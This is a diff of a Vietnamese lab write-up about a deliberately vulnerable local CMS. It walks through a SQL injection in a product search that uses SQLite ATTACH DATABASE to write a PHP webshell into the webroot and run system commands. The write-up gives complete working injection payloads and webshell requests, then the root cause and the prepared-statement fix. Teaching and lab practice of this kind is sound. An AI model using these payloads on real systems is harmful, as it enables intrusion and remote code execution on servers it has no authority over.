@@ -1,283 +1,360 @@
-﻿# Hướng 1: SQLite ATTACH DATABASE -> Webshell -> RCE
+## Hướng 1. SQLite ATTACH DATABASE RCE
 
-> Chỉ sử dụng trong lab local `BlueMarket CMS`. Không dùng payload này trên hệ thống không được phép.
+### Mô tả
 
-## 1. Vị trí lỗi trong app
-
-Chức năng người dùng nhìn thấy:
+BlueMarket CMS có chức năng tìm kiếm sản phẩm:
 
 ```text
-Product Search
 Route: /search?q=...
+Feature: Product Search + Analytics Cache
 ```
 
-File xử lý:
+Mỗi lần user search, app ghi keyword vào SQLite cache để hiển thị lại phần `Recent searches`.
+
+Điểm lỗi nằm ở service ghi cache:
 
 ```text
 app/src/Services/SqliteCacheService.php
 ```
 
-Đoạn code vulnerable:
+Code vulnerable:
 
 ```php
 $sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $keyword . "', datetime('now'))";
 $this->pdo->exec($sql);
 ```
 
-Ý tưởng:
+Với từ khóa bình thường như `dock`, câu SQL thực tế là:
+
+```sql
+INSERT INTO search_logs(keyword, created_at)
+VALUES ('dock', datetime('now'))
+```
+
+Mục tiêu của payload là thoát khỏi chuỗi `keyword`, kết thúc câu `INSERT` hiện
+tại, sau đó chèn thêm các câu SQL SQLite khác. Đây là lý do payload phải bắt đầu
+bằng một dấu `'` ở vị trí phù hợp, không phải một chuỗi SQL ngẫu nhiên.
+
+Input `q` được nối trực tiếp vào câu SQL SQLite. Vì dùng `exec()`, payload có thể chèn stacked query.
+
+#### Phân tích source và điều kiện cần
+
+Flow trong source:
 
 ```text
-User input q
--> được nối trực tiếp vào câu INSERT của SQLite
--> attacker đóng chuỗi keyword
--> thêm stacked query
--> dùng ATTACH DATABASE để tạo file trong webroot
--> chèn PHP code vào file đó
--> gọi file qua browser
--> PHP-FPM thực thi lệnh
+SearchController::search()
+-> lấy $_GET['q']
+-> SqliteCacheService::logSearch($q)
+-> vulnerable branch ghép q vào INSERT
+-> PDO::exec($sql) gửi cả chuỗi cho SQLite
+-> recentSearches() đọc lại cache để hiển thị
 ```
 
-## 2. Kiểm tra lab đang chạy
+Điểm quyết định nằm ở nhánh mode:
 
-```powershell
-cd D:\SQL-lead-to-RCE\blue-market-lab
-docker compose ps
+```php
+if ($this->mode === 'fixed') {
+    $stmt = $this->pdo->prepare(
+        'INSERT INTO search_logs(keyword, created_at) VALUES (:keyword, datetime("now"))'
+    );
+    $stmt->execute(['keyword' => $keyword]);
+    return;
+}
+
+$sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $keyword . "', datetime('now'))";
+$this->pdo->exec($sql);
 ```
 
-Mở search bình thường:
+Chain chỉ thực hiện được khi các điều kiện sau cùng đúng:
 
-```powershell
-curl.exe "http://localhost:5000/search?q=dock"
+```text
+1. APP_MODE=vulnerable để đi vào nhánh nối chuỗi.
+2. Parameter q khác rỗng và đi tới logSearch().
+3. PDO SQLite cho phép exec() xử lý nhiều statement.
+4. File SQLite cache và thư mục uploads có quyền ghi.
+5. Đường dẫn uploads nằm trong webroot để file tạo ra truy cập được qua HTTP.
+6. Nginx/PHP-FPM xử lý file .php trong uploads.
 ```
 
-Kỳ vọng: trang search trả về kết quả sản phẩm và analytics cache ghi keyword `dock`.
+Nếu chuyển sang fixed mode, `prepare()` coi toàn bộ payload là keyword nên dấu
+`;`, `ATTACH` và PHP code không còn được SQLite phân tích như SQL. `ATTACH`
+cũng chỉ tạo được file nếu process web có quyền ghi vào thư mục đích.
 
-## 3. Thử SQLi cơ bản
+Chain khai thác:
 
-Payload thử lỗi đầu tiên:
+```text
+SQL Injection trong /search?q=
+-> stacked query trong SQLite
+-> ATTACH DATABASE tạo file .php trong webroot
+-> INSERT PHP webshell vào file đó
+-> truy cập /uploads/cache.php?cmd=id
+-> RCE dưới quyền www-data
+```
+
+![alt text](image-huong-1-01-search-page.png)
+
+### Phân tích và khai thác
+
+Đầu tiên truy cập chức năng search bình thường:
+
+```http
+GET /search?q=dock HTTP/1.1
+Host: localhost:5000
+```
+
+Response trả về danh sách sản phẩm và phần analytics cache.
+
+![alt text](image-huong-1-02-normal-search-burp.png)
+
+Thử payload lỗi đơn giản:
+
+**Source tại bước này:** `SearchController::search()` lấy `$_GET['q']` rồi gọi
+`SqliteCacheService::logSearch($q)`. Ở vulnerable mode, `logSearch()` ghép `q`
+vào string SQL trước khi gọi `PDO::exec()`, nên chỉ một dấu nháy cũng đi thẳng
+vào SQLite parser.
 
 ```text
 '
 ```
 
-Gửi request:
+Request:
 
-```powershell
-curl.exe -G --data-urlencode "q='" http://localhost:5000/search
+```http
+GET /search?q=' HTTP/1.1
+Host: localhost:5000
 ```
 
-Nếu app đang ở `APP_MODE=vulnerable`, bạn sẽ thấy lỗi SQLite vì câu SQL bị vỡ:
+Trong vulnerable mode, câu SQL bị vỡ:
 
 ```sql
 INSERT INTO search_logs(keyword, created_at) VALUES (''', datetime('now'))
 ```
 
-Giải thích:
+Nếu response hiển thị lỗi SQLite, ta xác nhận được tham số `q` đi vào SQL parser.
+
+![alt text](image-huong-1-03-single-quote-error.png)
+
+Tiếp theo kiểm tra stacked query bằng payload an toàn:
+
+**Source tại bước này:** vẫn là câu `INSERT` trong `logSearch()`. Vì source mở
+chuỗi bằng `VALUES ('` và đóng bằng `', datetime('now'))`, payload phải tự đóng
+giá trị keyword trước khi thêm statement `INSERT` thứ hai.
+
+```sql
+x', datetime('now')); INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now')); --
+```
+
+Payload được ráp từ các mảnh nhỏ:
 
 ```text
-Dấu ' của attacker làm chuỗi SQL bị sai cú pháp
--> SQLite báo lỗi syntax
--> chứng minh input q đang đi vào SQL parser
+x', datetime('now'));       đóng giá trị keyword và kết thúc INSERT gốc
+INSERT INTO ...              câu INSERT thứ hai để tạo bằng chứng
+--                             comment phần SQL còn dư do ứng dụng nối thêm
 ```
 
-## 4. Thử stacked query an toàn
-
-Mục tiêu bước này là chứng minh có thể chèn thêm câu SQL sau câu `INSERT`.
-
-Payload:
+Sau khi ứng dụng nối `q` vào query, SQLite nhận được tương đương:
 
 ```sql
-x', datetime('now')); INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now')); --
-```
-
-Gửi request:
-
-```powershell
-$payload = @'
-x', datetime('now')); INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now')); --
-'@
-
-curl.exe -G --data-urlencode "q=$payload" http://localhost:5000/search
-```
-
-Câu SQL sau khi ghép sẽ có dạng:
-
-```sql
-INSERT INTO search_logs(keyword, created_at) VALUES ('x', datetime('now'));
-INSERT INTO search_logs(keyword, created_at) VALUES ('sqli_stacked_ok', datetime('now'));
+INSERT INTO search_logs(keyword, created_at)
+VALUES ('x', datetime('now'));
+INSERT INTO search_logs(keyword, created_at)
+VALUES ('sqli_stacked_ok', datetime('now'));
 --', datetime('now'))
 ```
 
-Kiểm tra trên giao diện:
+Câu đầu là phần query gốc đã được đóng đúng, câu thứ hai ghi marker vào cache,
+còn `--` vô hiệu hóa phần `', datetime('now'))` còn lại của query gốc. Nếu
+`sqli_stacked_ok` xuất hiện trong `Recent searches`, ta đã chứng minh được
+stacked query trước khi thử ghi file.
 
-```text
-Mở /search
--> nhìn khung Analytics Cache
--> nếu thấy keyword sqli_stacked_ok thì stacked query đã chạy
+Gửi bằng Burp Repeater:
+
+```http
+GET /search?q=<URL_ENCODED_PAYLOAD> HTTP/1.1
+Host: localhost:5000
 ```
 
-## 5. Xây dựng payload ghi webshell từng phần
+Sau đó mở lại `/search`, nếu phần `Recent searches` có dòng `sqli_stacked_ok` thì stacked query đã chạy.
 
-### 5.1. Đóng câu INSERT gốc
+![alt text](image-huong-1-04-stacked-query-proof.png)
 
-Câu gốc:
+Câu SQL gốc có dạng:
 
 ```sql
 INSERT INTO search_logs(keyword, created_at) VALUES ('<q>', datetime('now'))
 ```
 
-Ta cần biến `<q>` thành:
+Ta cần đóng phần keyword trước:
 
 ```sql
 x', datetime('now'));
 ```
 
-Kết quả:
-
-```sql
-INSERT INTO search_logs(keyword, created_at) VALUES ('x', datetime('now'));
-```
-
-### 5.2. ATTACH DATABASE
-
-Mục tiêu là tạo file PHP trong webroot:
-
-```text
-/var/www/html/public/uploads/cache.php
-```
-
-SQL:
+Sau đó dùng `ATTACH DATABASE` để tạo file trong webroot:
 
 ```sql
 ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
 ```
 
-Giải thích:
+SQLite sẽ tạo file `cache.php` như một SQLite database mới. Vì file nằm trong `public/uploads`, có thể truy cập qua HTTP.
 
-```text
-SQLite sẽ tạo file cache.php như một SQLite database mới.
-Vì file nằm trong public/uploads và Nginx cho PHP-FPM xử lý .php, file này có thể được gọi qua browser.
-```
-
-### 5.3. Tạo bảng trong attached database
+Tiếp tục tạo bảng trong attached database:
 
 ```sql
 CREATE TABLE IF NOT EXISTS shell.payload (code TEXT);
 ```
 
-Giải thích:
-
-```text
-Bảng payload được tạo trong database alias shell.
-Vì shell trỏ tới cache.php, schema/table data sẽ được ghi vào file cache.php.
-```
-
-### 5.4. Chèn PHP code
-
-PHP code cần chèn:
-
-```php
-<?php system($_GET['cmd'] ?? 'id'); ?>
-```
-
-SQL:
+Chèn PHP webshell vào file:
 
 ```sql
 INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>');
 ```
 
-Giải thích:
+Dấu `'` bên trong PHP phải escape thành `''` để không làm vỡ chuỗi SQL.
 
-```text
-Trong chuỗi SQL, dấu ' bên trong PHP phải được escape thành '' để không làm vỡ câu INSERT.
-Khi gọi /uploads/cache.php?cmd=pwd, PHP parser sẽ bỏ qua byte không nằm trong <?php ... ?>.
-Đến đoạn PHP code, hàm system() sẽ chạy tham số cmd.
-```
+Payload hoàn chỉnh:
 
-### 5.5. Comment phần SQL còn lại
+**Source tại bước này:** `PDO::exec()` cho phép gửi chuỗi có nhiều statement,
+còn SQLite `ATTACH DATABASE` có thể tạo file tại đường dẫn mà process web ghi
+được. Vì vậy payload mở rộng từ marker trước đó bằng `ATTACH`, tạo bảng và
+ghi PHP vào database file.
 
 ```sql
---
-```
-
-Giải thích:
-
-```text
-Comment phần đuôi còn lại của câu SQL gốc: ', datetime('now'))
-```
-
-## 6. Payload hoàn chỉnh
-
-Nếu file cũ đã tồn tại, xóa trước:
-
-```powershell
-Remove-Item -Force .\app\public\uploads\cache.php -ErrorAction SilentlyContinue
-```
-
-Gửi payload:
-
-```powershell
-$payload = @'
 x', datetime('now')); ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell; CREATE TABLE IF NOT EXISTS shell.payload (code TEXT); DELETE FROM shell.payload; INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>'); --
-'@
-
-curl.exe -G --data-urlencode "q=$payload" http://localhost:5000/search
 ```
 
-## 7. Kích hoạt RCE
-
-Chạy lệnh `pwd`:
-
-```powershell
-curl.exe "http://localhost:5000/uploads/cache.php?cmd=pwd"
-```
-
-Chạy lệnh `id`:
-
-```powershell
-curl.exe "http://localhost:5000/uploads/cache.php?cmd=id"
-```
-
-Chạy lệnh `whoami`:
-
-```powershell
-curl.exe "http://localhost:5000/uploads/cache.php?cmd=whoami"
-```
-
-Kết quả có thể có dữ liệu SQLite ở đầu file:
+Đây là cùng primitive vừa kiểm tra, chỉ thay câu `INSERT` marker bằng bốn bước
+ghi webshell:
 
 ```text
-SQLite format 3...
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+1. đóng INSERT gốc
+2. ATTACH DATABASE tạo cache.php
+3. CREATE TABLE tạo nơi lưu nội dung
+4. DELETE dọn dữ liệu cũ nếu file đã tồn tại
+5. INSERT ghi PHP vào bảng attached
+6. -- comment phần query còn dư
 ```
 
-Phần cần chụp làm minh chứng là output của lệnh, ví dụ `/var/www/html/public/uploads`.
+Query SQLite sau khi nối payload có dạng:
 
-## 8. Cleanup
-
-```powershell
-Remove-Item -Force .\app\public\uploads\cache.php -ErrorAction SilentlyContinue
+```sql
+INSERT INTO search_logs(keyword, created_at)
+VALUES ('x', datetime('now'));
+ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
+CREATE TABLE IF NOT EXISTS shell.payload (code TEXT);
+DELETE FROM shell.payload;
+INSERT INTO shell.payload
+VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>');
+--', datetime('now'))
 ```
 
-## 9. Điều kiện để thành công
+Hai dấu nháy liên tiếp trong `$_GET[''cmd'']` và `''id''` là cách escape dấu
+nháy bên trong PHP string của SQLite. Sau khi file được tạo, HTTP request tới
+`/uploads/cache.php` mới là bước thực thi PHP; payload SQL chỉ tạo file.
+
+**Vì sao payload Hướng 1 kết thúc bằng `--`?**
+
+Query gốc luôn còn phần này ở phía sau giá trị `q`:
+
+```sql
+INSERT INTO search_logs(keyword, created_at)
+VALUES ('<q>', datetime('now'))
+```
+
+Sau khi payload đóng `keyword` và chạy các statement riêng, ứng dụng vẫn nối
+phần còn lại `', datetime('now'))`. Query đầy đủ có dạng:
+
+```sql
+INSERT INTO search_logs(keyword, created_at)
+VALUES ('x', datetime('now'));
+ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
+CREATE TABLE IF NOT EXISTS shell.payload (code TEXT);
+DELETE FROM shell.payload;
+INSERT INTO shell.payload
+VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>');
+--', datetime('now'))
+```
+
+`--` biến phần `', datetime('now'))` còn dư thành comment SQLite. Nếu bỏ `--`,
+phần dư có thể làm hỏng câu lệnh cuối. Hướng 1 không cần thêm `SELECT ...`
+ở cuối vì `SqliteCacheService` chỉ gọi `PDO::exec()` để ghi cache, không cần
+trả về một result set cho view. Việc chạy PHP xảy ra ở request HTTP sau đó,
+không phải trong câu SQL này.
+
+Gửi payload bằng Burp:
+
+```http
+GET /search?q=<URL_ENCODED_PAYLOAD> HTTP/1.1
+Host: localhost:5000
+```
+
+Trong Burp có thể paste payload vào parameter `q`, sau đó URL-encode value.
+
+![alt text](image-huong-1-05-attach-database-payload.png)
+
+Sau khi request tạo file thành công, truy cập webshell:
+
+```http
+GET /uploads/cache.php?cmd=id HTTP/1.1
+Host: localhost:5000
+```
+
+Thử thêm các lệnh an toàn:
+
+```http
+GET /uploads/cache.php?cmd=whoami HTTP/1.1
+Host: localhost:5000
+```
+
+```http
+GET /uploads/cache.php?cmd=pwd HTTP/1.1
+Host: localhost:5000
+```
+
+Kết quả mong đợi:
 
 ```text
-1. APP_MODE=vulnerable.
-2. SQLite exec() chấp nhận stacked query.
-3. Process web ghi được vào /var/www/html/public/uploads.
-4. Nginx/PHP-FPM xử lý file .php trong uploads.
-5. Payload có đoạn <?php ... ?> hợp lệ.
+www-data
+/var/www/html/public
 ```
 
-## 10. Fixed mode chặn ở đâu
+![alt text](image-huong-1-06-rce-proof.png)
 
-Trong fixed mode, `SqliteCacheService.php` dùng prepared statement:
+Sau khi demo xong, cleanup file webshell:
+
+```powershell
+docker compose exec web rm -f /var/www/html/public/uploads/cache.php
+```
+
+![alt text](image-huong-1-07-cleanup.png)
+
+### Root cause
+
+Lỗi chính là app nối trực tiếp input `q` vào SQL SQLite:
+
+```text
+1. User kiểm soát parameter q.
+2. q được đưa thẳng vào INSERT bằng string concatenation.
+3. PDO exec() cho phép chạy stacked query.
+4. SQLite ATTACH DATABASE có thể tạo file mới trên filesystem.
+5. Thư mục uploads nằm trong webroot và file .php được PHP-FPM xử lý.
+```
+
+Trong fixed mode, code dùng prepared statement:
 
 ```php
 $stmt = $this->pdo->prepare('INSERT INTO search_logs(keyword, created_at) VALUES (:keyword, datetime("now"))');
 $stmt->execute(['keyword' => $keyword]);
 ```
 
-Lúc này payload chỉ là dữ liệu keyword, không còn là cú pháp SQL.
+Khi đó payload chỉ còn là dữ liệu keyword, không thể trở thành cú pháp SQL.
 
+Tóm tắt root cause:
 
+```text
+1. SQL Injection do nối chuỗi.
+2. Dùng exec() cho dữ liệu user-controlled.
+3. Webroot cho phép ghi file thông qua SQLite ATTACH.
+4. Upload/public path cho phép execute PHP.
+5. Thiếu tách biệt giữa vùng lưu dữ liệu và vùng có thể thực thi code.
+```
